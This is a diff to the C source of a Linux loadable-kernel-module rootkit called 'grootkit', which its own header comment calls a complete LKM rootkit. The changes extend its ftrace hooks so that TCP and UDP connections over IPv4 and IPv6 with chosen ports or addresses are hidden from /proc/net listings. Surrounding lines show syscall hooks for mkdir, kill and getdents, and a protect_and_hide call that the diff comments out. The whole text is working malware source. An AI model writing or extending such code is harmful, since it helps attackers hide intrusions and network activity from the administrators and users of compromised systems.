@@ -1,3 +1,5 @@
+// This file implements a complete LKM rootkit
+
 /*
     Copyright (C) 2023  Maurice Lambert
     This program is free software: you can redistribute it and/or modify
@@ -144,9 +146,12 @@ typedef asmlinkage long (*mkdir_signature)(const char __user *, umode_t);
 typedef asmlinkage long (*kill_signature)(pid_t, int);
 #endif
 
-typedef asmlinkage long (*tcp4_seq_show_signature)(struct seq_file *, void *);
+typedef asmlinkage long (*tcp_seq_show_signature)(struct seq_file *, void *);
 
-tcp4_seq_show_signature tcp4_seq_show_base;
+tcp_seq_show_signature tcp4_seq_show_base;
+tcp_seq_show_signature tcp6_seq_show_base;
+tcp_seq_show_signature udp4_seq_show_base;
+tcp_seq_show_signature udp6_seq_show_base;
 getdents64_signature getdents64_base;
 getdents_signature getdents_base;
 mkdir_signature mkdir_base;
@@ -480,10 +485,10 @@ asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent *directory, un
 }
 
 /*
-    This function hooks tcp4_seq_show_hook to hide
-    IPv4 TCP connection whith specific port or IP address.
+    This function hide TCP connection with
+    specific port or IPv4 address.
 */
-asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *s) {
+asmlinkage long tcp_seq_show_hook(struct seq_file *seq, void *s, tcp_seq_show_signature function) {
     // printk(KERN_CRIT "sport: %i %i, dport: %i %i, ip: %i %i\n", sport, source_port, dport, destination_port, ip, ip_address);
 
     if (s != SEQ_START_TOKEN) {
@@ -492,20 +497,25 @@ asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *s) {
         unsigned int s2_ip_address;
         unsigned short s_source_port;
         unsigned short s_destination_port;
+        int is_ipv4 = function == tcp4_seq_show_base || function == udp4_seq_show_base;
         // printk(KERN_CRIT "Not SEQ_START_TOKEN %i=%i %i=%i %li=%li %li=%li\n", sport, socket->inet_sport, dport, socket->inet_dport, ip, socket->inet_saddr, ip, socket->inet_daddr);
-        
+
         if (socket->sk_state == TCP_TIME_WAIT) {
             // printk(KERN_CRIT "TCP_TIME_WAIT\n");
             struct inet_timewait_sock *tw = (struct inet_timewait_sock *)s;
-            s1_ip_address = tw->tw_daddr;
-            s2_ip_address = tw->tw_rcv_saddr;
+            if (is_ipv4) {
+                s1_ip_address = tw->tw_daddr;
+                s2_ip_address = tw->tw_rcv_saddr;
+            }
             s_source_port = tw->tw_sport;
             s_destination_port = tw->tw_dport;
         } else if (socket->sk_state == TCP_NEW_SYN_RECV) {
             // printk(KERN_CRIT "TCP_NEW_SYN_RECV\n");
             struct inet_request_sock *ireq = (struct inet_request_sock *)s;
-            s1_ip_address = ireq->ir_rmt_addr;
-            s2_ip_address = ireq->ir_loc_addr;
+            if (is_ipv4) {
+                s1_ip_address = ireq->ir_rmt_addr;
+                s2_ip_address = ireq->ir_loc_addr;
+            }
             s_source_port = ireq->ir_num;
             s_destination_port = ireq->ir_rmt_port;
         } else {
@@ -513,8 +523,10 @@ asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *s) {
             // struct inet_sock *inet = inet_sk(socket);
             // printk(KERN_CRIT "else %p\n", regs->ip);
             struct inet_sock *inet = (struct inet_sock *)socket;
-            s1_ip_address = inet->inet_daddr;
-            s2_ip_address = inet->inet_rcv_saddr;
+            if (is_ipv4) {
+                s1_ip_address = inet->inet_daddr;
+                s2_ip_address = inet->inet_rcv_saddr;
+            }
             s_destination_port = inet->inet_dport;
             s_source_port = inet->inet_sport;
         }
@@ -522,14 +534,44 @@ asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *s) {
         if (
             (source_port && source_port == s_source_port) ||
             (destination_port && destination_port == s_destination_port) ||
-            (ip_address && (ip_address == s1_ip_address || ip_address == s2_ip_address))
+            (is_ipv4 && ip_address &&
+                (ip_address == s1_ip_address || ip_address == s2_ip_address)
+            )
         ) {
             // printk(KERN_CRIT "connection hidden for specific TCP port or IP address\n");
             return 0;
         }
     }
 
-    return tcp4_seq_show_base(seq, s);
+    return function(seq, s);
+}
+
+/*
+    This function hooks tcp4_seq_show_hook to hide TCP connections.
+*/
+asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *s) {
+    return tcp_seq_show_hook(seq, s, tcp4_seq_show_base);
+}
+
+/*
+    This function hooks tcp6_seq_show_hook to hide TCP connections.
+*/
+asmlinkage long tcp6_seq_show_hook(struct seq_file *seq, void *s) {
+    return tcp_seq_show_hook(seq, s, tcp6_seq_show_base);
+}
+
+/*
+    This function hooks udp4_seq_show_hook to hide TCP connections.
+*/
+asmlinkage long udp4_seq_show_hook(struct seq_file *seq, void *s) {
+    return tcp_seq_show_hook(seq, s, udp4_seq_show_base);
+}
+
+/*
+    This function hooks udp6_seq_show_hook to hide TCP connections.
+*/
+asmlinkage long udp6_seq_show_hook(struct seq_file *seq, void *s) {
+    return tcp_seq_show_hook(seq, s, udp6_seq_show_base);
 }
 
 /*
@@ -576,9 +618,12 @@ void *syscall_hooking(unsigned long new_function, unsigned int syscall_number) {
 }
 
 /*
-    Define hook structure for tcp4_seq_show symbol.
+    Define hook structure for xxpX_seq_show symbols.
 */
 struct ftrace_hook tcp4_seq_show_struct = {"tcp4_seq_show", tcp4_seq_show_hook, &tcp4_seq_show_base, 0, {}};
+struct ftrace_hook tcp6_seq_show_struct = {"tcp6_seq_show", tcp6_seq_show_hook, &tcp6_seq_show_base, 0, {}};
+struct ftrace_hook udp6_seq_show_struct = {"udp6_seq_show", udp6_seq_show_hook, &udp6_seq_show_base, 0, {}};
+struct ftrace_hook udp4_seq_show_struct = {"udp4_seq_show", udp4_seq_show_hook, &udp4_seq_show_base, 0, {}};
 
 /*
     This function changes RIP register to call hooked function.
@@ -641,7 +686,7 @@ void symbol_unhooking(struct ftrace_hook *hook) {
 */
 static int __init grootkit_init(void) {
     // printk(KERN_INFO "Protect and hide\n");
-    protect_and_hide();
+    // protect_and_hide();
     // printk(KERN_INFO "mkdir syscall hooking\n");
     mkdir_base = syscall_hooking((unsigned long)mkdir_hook, (unsigned int)__NR_mkdir);
     // printk(KERN_INFO "kill syscall hooking\n");
@@ -652,6 +697,9 @@ static int __init grootkit_init(void) {
     getdents_base = syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_getdents);
     // printk(KERN_INFO "tcp4_seq_show syscall hooking %p\n", tcp4_seq_show_base);
     tcp4_seq_show_base = symbol_hooking(&tcp4_seq_show_struct);
+    tcp6_seq_show_base = symbol_hooking(&tcp6_seq_show_struct);
+    udp4_seq_show_base = symbol_hooking(&udp4_seq_show_struct);
+    udp6_seq_show_base = symbol_hooking(&udp6_seq_show_struct);
     // printk(KERN_INFO "tcp4_seq_show syscall hooking %p\n", tcp4_seq_show_base);
     // printk(KERN_INFO "return\n");
     return 0;
@@ -666,6 +714,9 @@ static void __exit grootkit_exit(void) {
     syscall_hooking((unsigned long)getdents64_base, (unsigned int)__NR_getdents64);
     syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_getdents);
     symbol_unhooking(&tcp4_seq_show_struct);
+    symbol_unhooking(&tcp6_seq_show_struct);
+    symbol_unhooking(&udp6_seq_show_struct);
+    symbol_unhooking(&udp4_seq_show_struct);
 }
 
 module_init(grootkit_init);
